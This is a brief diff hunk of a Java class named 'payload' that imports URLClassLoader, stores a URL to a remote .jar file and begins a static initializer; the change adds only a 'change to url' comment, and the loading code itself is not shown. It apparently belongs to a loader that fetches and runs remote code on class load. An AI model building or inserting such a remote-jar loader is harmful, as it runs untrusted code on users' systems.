@@ -6,7 +6,7 @@ import java.net.URL;
 import java.net.URLClassLoader;
 
 public class payload {
-    public static String url = "https://x.glowman554.gq/files/bla.jar";
+    public static String url = "https://x.glowman554.gq/files/bla.jar"; // change to url
 
     static {
         try {
